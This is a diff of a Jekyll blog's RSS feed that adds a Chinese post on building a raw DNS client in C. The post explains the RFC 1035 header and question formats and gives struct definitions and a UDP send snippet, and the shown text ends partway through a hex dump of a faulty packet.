@@ -5,9 +5,397 @@
     <description>&lt;h1 style='color:white;'&gt;倾旋的博客&lt;/h1&gt;&lt;h3&gt;岁月静好，现世安稳。&lt;/h3&gt;</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Fri, 09 Feb 2018 15:47:23 +0800</pubDate>
-    <lastBuildDate>Fri, 09 Feb 2018 15:47:23 +0800</lastBuildDate>
+    <pubDate>Sat, 10 Feb 2018 20:30:54 +0800</pubDate>
+    <lastBuildDate>Sat, 10 Feb 2018 20:30:54 +0800</lastBuildDate>
     <generator>Jekyll v3.7.2</generator>
+    
+      <item>
+        <title>DNS协议编程</title>
+        <description>&lt;p&gt;本文总结一下自己写原生DNS客户端的过程。
+&lt;!--more--&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;0x01-前言&quot;&gt;0x01 前言&lt;/h2&gt;
+
+&lt;p&gt;由于之前一直使用&lt;code class=&quot;highlighter-rouge&quot;&gt;Linux&lt;/code&gt;下&lt;code class=&quot;highlighter-rouge&quot;&gt;ldns&lt;/code&gt;这个库，但是那么多方法，真的看起来很心累，刚好一直在学习&lt;code class=&quot;highlighter-rouge&quot;&gt;socket&lt;/code&gt;编程，准备从底层实现这个客户端。&lt;/p&gt;
+
+&lt;h2 id=&quot;0x02-dns介绍&quot;&gt;0x02 DNS介绍&lt;/h2&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;DNS（Domain Name System）&lt;/code&gt;是一个提供域名解析服务的分布式系统，主要功能是完成域名与其对应的IP地址之间的相互转换。网络中提供DNS服务的主机叫做DNS服务器，而向DNS服务器发起查询请求的主机叫做DNS客户端，客户端与服务器之间通过DNS协议这一种应用层协议来相互通信并交换数据。&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;DNS&lt;/code&gt;协议建立在UDP或&lt;code class=&quot;highlighter-rouge&quot;&gt;TCP&lt;/code&gt;协议之上，&lt;code class=&quot;highlighter-rouge&quot;&gt;DNS&lt;/code&gt;服务器开放&lt;code class=&quot;highlighter-rouge&quot;&gt;UDP:53&lt;/code&gt;端口和&lt;code class=&quot;highlighter-rouge&quot;&gt;TCP:53&lt;/code&gt;端口监听客户端发来的请求。一般情况下客户端通过UDP协议封装请求报文，服务器也用UDP协议封装回应报文；由于广域网中不适合传输过大的UDP数据包，因此规定当封装了DNS回应的UDP数据包长度可能超过512字节时，客户端应该使用&lt;code class=&quot;highlighter-rouge&quot;&gt;TCP&lt;/code&gt;协议连接DNS服务器并传输请求和回应，具体包括以下两种情况：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;客户端认为UDP回应包长度可能超过512字节，主动使用&lt;code class=&quot;highlighter-rouge&quot;&gt;TCP&lt;/code&gt;协议；&lt;/li&gt;
+  &lt;li&gt;客户端第一次使用UDP协议发送DNS请求，服务端发现UDP回应包会超过&lt;code class=&quot;highlighter-rouge&quot;&gt;512&lt;/code&gt;字节，截断&lt;code class=&quot;highlighter-rouge&quot;&gt;UDP&lt;/code&gt;包中的回应报文，并在回应报文中为&lt;code class=&quot;highlighter-rouge&quot;&gt;TC&lt;/code&gt;字段置1以通知客户端该报文已经被截断，客户端收到之后再发起一次&lt;code class=&quot;highlighter-rouge&quot;&gt;TCP&lt;/code&gt;请求。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;0x03-dns报文格式&quot;&gt;0x03 DNS报文格式&lt;/h2&gt;
+
+&lt;p&gt;简单的铺垫就到这里，先来记录一下我遇到的坑；  首先我是去看了&lt;code class=&quot;highlighter-rouge&quot;&gt;DNS&lt;/code&gt;的报文格式，然后又参考了网上的一些&lt;code class=&quot;highlighter-rouge&quot;&gt;文章&lt;/code&gt;，发现标志位有反有正，导致我写了一个查询&lt;code class=&quot;highlighter-rouge&quot;&gt;A&lt;/code&gt;记录的请求一直报错。&lt;/p&gt;
+
+&lt;p&gt;DNS数据报由头部和记录部分组成，其中请求报文只有问题部分，而回应报文可以有问题部分、回答部分、授权部分和附加部分。&lt;/p&gt;
+
+&lt;p&gt;可以参考：&lt;code class=&quot;highlighter-rouge&quot;&gt;RFC1035&lt;/code&gt;文档来获悉&lt;/p&gt;
+
+&lt;p&gt;简单介绍一些基础：&lt;/p&gt;
+
+&lt;h3 id=&quot;报文格式&quot;&gt;报文格式&lt;/h3&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    +---------------------+
+    |        Header       | 报文头
+    +---------------------+
+    |       Question      | 查询的问题
+    +---------------------+
+    |        Answer       | 应答
+    +---------------------+
+    |      Authority      | 授权应答
+    +---------------------+
+    |      Additional     | 附加信息
+    +---------------------+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Header&lt;/code&gt;段是必须存在的，它定义了报文是请求还是应答，也定义了其他段是否需要存在，以及是标准查询还是其他。&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Question&lt;/code&gt;段描述了查询的问题，包括&lt;code class=&quot;highlighter-rouge&quot;&gt;查询类型(QTYPE)&lt;/code&gt;，&lt;code class=&quot;highlighter-rouge&quot;&gt;查询类(QCLASS)&lt;/code&gt;，以及&lt;code class=&quot;highlighter-rouge&quot;&gt;查询的域名(QNAME)&lt;/code&gt;。&lt;/li&gt;
+  &lt;li&gt;剩下的3个段包含相同的格式:一系列可能为空的资源记录(RRs)。&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Answer&lt;/code&gt;段包含回答问题的RRs；授权段包含授权域名服务器的RRs；&lt;/li&gt;
+  &lt;li&gt;附加段包含和请求相关的，但是不是必须回答的RRs。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;今天研究的只是&lt;code class=&quot;highlighter-rouge&quot;&gt;报文&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;查询问题&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;报文头包含如下字段：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
+    |                      ID                       |
+    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
+    |QR|   Opcode |AA|TC|RD|RA|   Z    |   RCODE    |
+    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
+    |                    QDCOUNT                    |
+    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
+    |                    ANCOUNT                    |
+    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
+    |                    NSCOUNT                    |
+    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
+    |                    ARCOUNT                    |
+    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;在&lt;code class=&quot;highlighter-rouge&quot;&gt;C语言&lt;/code&gt;中我们可以依次从上到下，从左到右的方式进行填充。&lt;/p&gt;
+
+&lt;h3 id=&quot;header各字段分别解释如下&quot;&gt;Header各字段分别解释如下：&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ID&lt;/code&gt;      请求客户端设置的16位标示，服务器给出应答的时候会带相同的标示字段回来，这样请求客户端就可以区分不同的请求应答了。&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;QR&lt;/code&gt;      1个比特位用来区分是请求（0）还是应答（1）。&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;OPCODE&lt;/code&gt; 4个比特位用来设置查询的种类，应答的时候会带相同值，可用的值如下：&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0               标准查询 (QUERY)
+1               反向查询 (IQUERY)
+2               服务器状态查询 (STATUS)
+3-15            保留值，暂时未使用
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;AA&lt;/code&gt;      授权应答(Authoritative Answer) - 这个比特位在应答的时候才有意义，指出给出应答的服务器是查询域名的授权解析服务器。注意：因为别名的存在，应答可能存在多个主域名，这个AA位对应请求名，或者应答中的第一个主域名。&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;TC&lt;/code&gt;      截断(TrunCation) - 用来指出报文比允许的长度还要长，导致被截断。&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;RD&lt;/code&gt;      期望递归(Recursion Desired) - 这个比特位被请求设置，应答的时候使用的相同的值返回。如果设置了RD，就建议域名服务器进行递归解析，递归查询的支持是可选的。&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;RA&lt;/code&gt;      支持递归(Recursion Available) - 这个比特位在应答中设置或取消，用来代表服务器是否支持递归查询。&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Z&lt;/code&gt;       保留值，暂时未使用。在所有的请求和应答报文中必须置为0。&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;RCODE&lt;/code&gt;   应答码(Response code) - 这4个比特位在应答报文中设置，代表的含义如下：&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0               没有错误。
+1               报文格式错误(Format error) - 服务器不能理解请求的报文。
+2               服务器失败(Server failure) - 因为服务器的原因导致没办法处理这个请求。
+3               名字错误(Name Error) - 只有对授权域名解析服务器有意义，指出解析的域名不存在。
+4               没有实现(Not Implemented) - 域名服务器不支持查询类型。
+5               拒绝(Refused) - 服务器由于设置的策略拒绝给出应答。比如，服务器不希望对某些请求者给出应答，或者服务器不希望进行某些操作（比如区域传送zone transfer）。
+6-15            保留值，暂时未使用。
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;QDCOUNT 无符号16位整数表示报文请求段中的问题记录数。&lt;/li&gt;
+  &lt;li&gt;ANCOUNT 无符号16位整数表示报文回答段中的回答记录数。&lt;/li&gt;
+  &lt;li&gt;NSCOUNT 无符号16位整数表示报文授权段中的授权记录数。&lt;/li&gt;
+  &lt;li&gt;ARCOUNT 无符号16位整数表示报文附加段中的附加记录数。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;question的字段格式&quot;&gt;Question的字段格式&lt;/h3&gt;
+
+&lt;p&gt;在大多数查询中，&lt;code class=&quot;highlighter-rouge&quot;&gt;Question&lt;/code&gt;段包含着问题(question)，比如，指定问什么。这个段包含&lt;code class=&quot;highlighter-rouge&quot;&gt;QDCOUNT(usually 1)&lt;/code&gt;个问题&lt;/p&gt;
+
+&lt;p&gt;每个问题为下面的格式：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
+|                                               |
+|                     QNAME                     |
+|                                               |
++--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
+|                     QTYPE                     |
++--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
+|                     QCLASS                    |
++--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;字段含义如下:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;QNAME&lt;/code&gt;  域名被编码为一些labels序列，&lt;code class=&quot;highlighter-rouge&quot;&gt;每个labels包含一个字节表示后续字符串长度，以及这个字符串，以0长度和空字符串来表示域名结束。注意这个字段可能为奇数字节，不需要进行边界填充对齐&lt;/code&gt;。&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;QTYPE&lt;/code&gt;  &lt;code class=&quot;highlighter-rouge&quot;&gt;2个字节&lt;/code&gt;表示查询类型，.取值可以为任何可用的类型值，以及通配码来表示所有的资源记录。&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;QCLASS&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;2个字节&lt;/code&gt;表示查询的协议类，比如，IN代表Internet&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;0x04-编程思路&quot;&gt;0x04 编程思路&lt;/h2&gt;
+
+&lt;p&gt;我们一般会先申请一段连续的内存空间，然后采用结构体进行赋值，最后拼装起来&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;char buff[1024];&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;网上大部分是先根据报文格式定义&lt;code class=&quot;highlighter-rouge&quot;&gt;Header&lt;/code&gt;结构体：&lt;/p&gt;
+
+&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DNS_HEADER&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+ &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;short&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// identification number&lt;/span&gt;
+
+ &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// recursion desired&lt;/span&gt;
+ &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// truncated message&lt;/span&gt;
+ &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// authoritive answer&lt;/span&gt;
+ &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;opcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// purpose of message&lt;/span&gt;
+ &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;qr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// query/response flag&lt;/span&gt;
+
+ &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// response code&lt;/span&gt;
+ &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// checking disabled&lt;/span&gt;
+ &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ad&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// authenticated data&lt;/span&gt;
+ &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// its z! reserved&lt;/span&gt;
+ &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ra&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// recursion available&lt;/span&gt;
+
+ &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;short&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;q_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// number of question entries&lt;/span&gt;
+ &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;short&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ans_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// number of answer entries&lt;/span&gt;
+ &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;short&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;auth_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// number of authority entries&lt;/span&gt;
+ &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;short&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;add_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// number of resource entries&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;QUESTION&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+ &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;short&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;qtype&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+ &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;short&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;qclass&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+ &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+ &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;QUESTION&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ques&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;QUERY&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;然后通过指针进行指向每一段数据报文格式的起始位置：&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Dnsquery = (struct QUESTION*) &amp;amp;buf[sizeof(struct DNS_HEADER) + (strlen((const char*) qname) + 1)];&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;不断的对这个&lt;code class=&quot;highlighter-rouge&quot;&gt;buff&lt;/code&gt;进行分割，最后通过简单的UDP套接字传输过去：&lt;/p&gt;
+
+&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dnsSock&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_DGRAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sockaddr_in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dnsADDR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;dnsADDR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sin_family&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;dnsADDR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sin_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;inet_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;202.101.172.35&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;dnsADDR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sin_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;htons&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;53&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendto&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dnsSock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buff_length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sockaddr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dnsADDR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dnsADDR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+       &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt;  &lt;span class=&quot;s&quot;&gt;&quot;sendto failed&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dnsSock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;0x05-遇到的坑&quot;&gt;0x05 遇到的坑&lt;/h2&gt;
+
+&lt;p&gt;一开始当然是很粗心的看错了报文的定义大小，然后尝试定义了一些结构体，最后发送的数据与正确的数据包不一样：&lt;/p&gt;
+
+&lt;h3 id=&quot;失败的数据包&quot;&gt;失败的数据包&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;该数据包的标志ID为：&lt;code class=&quot;highlighter-rouge&quot;&gt;0x17c7&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0000   00 1c 42 00 00 18 00 1c 42 af 22 19 08 00 45 00  ..B.....B.&quot;...E.
+0010   00 4b 7b 22 40 00 40 11 07 16 0a d3 37 0e ca 65  .K{&quot;@.@.....7..e
